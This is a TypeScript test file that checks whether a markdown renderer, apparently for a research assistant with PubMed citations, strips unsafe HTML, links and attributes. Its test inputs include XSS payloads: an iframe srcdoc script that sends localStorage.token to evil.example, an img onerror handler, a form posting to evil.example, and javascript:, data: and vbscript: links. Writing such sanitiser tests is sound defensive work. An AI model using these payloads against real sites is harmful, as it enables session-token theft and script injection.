// Run with: node --test web/tests/   (Node 24 strips the TypeScript types)
// Renders answers through the same react-markdown configuration as MarkdownRenderer (audit F12).
import { test } from "node:test";
import assert from "node:assert/strict";
import { createElement } from "react";
import { renderToStaticMarkup } from "react-dom/server";
import ReactMarkdown from "react-markdown";
import remarkGfm from "remark-gfm";
import * as safety from "../src/lib/markdownSafety.ts";
import * as cite from "../src/lib/citations.ts";

const { rehypeStripUnsafe, remarkHtmlBreaks, safeUrl, safeUrlTransform, splitStreamingBlocks } = safety;

function render(markdown: string, rehypeExtra: any[] = []): string {
  return renderToStaticMarkup(
    createElement(
      ReactMarkdown as any,
      {
        skipHtml: true,
        remarkPlugins: [remarkGfm, remarkHtmlBreaks],
        rehypePlugins: [rehypeStripUnsafe, ...rehypeExtra],
        urlTransform: safeUrlTransform,
      },
      markdown
    )
  );
}

test("iframe with script-bearing srcdoc renders no active content", () => {
  const html = render(
    'Before\n\n<iframe srcdoc="<script>fetch(`https://evil.example/?t=${localStorage.token}`)</script>"></iframe>\n\nAfter'
  );
  assert.doesNotMatch(html, /<iframe/i);
  assert.doesNotMatch(html, /srcdoc/i);
  assert.doesNotMatch(html, /<script/i);
  assert.match(html, /Before/);
  assert.match(html, /After/);
});

test("inline img with onerror and other raw tags are dropped", () => {
  const html = render('Look <img src="x" onerror="alert(1)"> here <style>body{display:none}</style> <form action="https://evil.example"><input name="t"></form>');
  assert.doesNotMatch(html, /<img/i);
  assert.doesNotMatch(html, /onerror/i);
  assert.doesNotMatch(html, /<style/i);
  assert.doesNotMatch(html, /<form/i);
  assert.match(html, /Look/);
});

test("javascript:, data: and obfuscated scheme links lose their href", () => {
  // "java%09script:" is not a scheme (% is not allowed in one), so browsers treat it as a relative path.
  for (const href of ["javascript:alert(1)", "JaVaScRiPt:alert(1)", "data:text/html,<script>alert(1)</script>", "vbscript:x"]) {
    const html = render(`[click](<${href}>)`);
    assert.doesNotMatch(html, /href="(?:java|data|vbscript)/i, href);
  }
  assert.equal(safeUrl("javascript:alert(1)"), "");
  assert.equal(safeUrl("java\tscript:alert(1)"), "");
  assert.equal(safeUrl("https://pubmed.ncbi.nlm.nih.gov/1/"), "https://pubmed.ncbi.nlm.nih.gov/1/");
  assert.equal(safeUrl("#section"), "#section");
  assert.equal(safeUrl("mailto:a@b.org"), "mailto:a@b.org");
});

test("normal links, tables, code blocks and <br> in table cells still render", () => {
  const md = [
    "See [PubMed](https://pubmed.ncbi.nlm.nih.gov/42511798/).",
    "",
    "| Drug | Note |",
    "|---|---|",
    "| sotorasib | line one<br>line two |",
    "",
    "```python",
    "print('<b>not html</b>')",
    "```",
  ].join("\n");
  const html = render(md);
  assert.match(html, /<a href="https:\/\/pubmed\.ncbi\.nlm\.nih\.gov\/42511798\/">PubMed<\/a>/);
  assert.match(html, /<table>/);
  assert.match(html, /line one<br\/>\s*line two/);
  assert.match(html, /<code class="language-python">/);
  // Code is shown as text, not parsed as markup.
  assert.match(html, /&lt;b&gt;not html&lt;\/b&gt;/);
});

test("task-list checkboxes survive; injected data-cite attributes do not", () => {
  const html = render("- [x] done\n- [ ] open");
  assert.match(html, /type="checkbox"/);
  const tree: any = {
    type: "root",
    children: [{ type: "element", tagName: "a", properties: { href: "https://x.org", dataCiteKey: "PMID:1", onClick: "x" }, children: [] }],
  };
  rehypeStripUnsafe()(tree);
  assert.deepEqual(Object.keys(tree.children[0].properties), ["href"]);
});

test("citations are still linked after the unsafe-content strip", () => {
  const map = {
    version: 1,
    entries: {
      "PMID:42511798": {
        key: "PMID:42511798", id: "42511798", type: "pmid", url: "https://pubmed.ncbi.nlm.nih.gov/42511798/",
        source_agent: "Lithoscribe", source_tool: "lithoscribe", passages: [], verified: true,
      },
    },
    aliases: {},
    supports: [],
    unverified: [],
  };
  const html = render("Covalent inhibitors bind a pocket (PMID: 42511798).", [[cite.rehypeCitations, { map }]]);
  assert.match(html, /data-cite-key="PMID:42511798"/);
});

test("streaming blocks split at blank lines but never inside a code fence", () => {
  const blocks = splitStreamingBlocks("# Title\n\nPara one\n\n```\ncode\n\nmore code\n```\n\nTail");
  assert.deepEqual(blocks, ["# Title", "Para one", "```\ncode\n\nmore code\n```", "Tail"]);
});
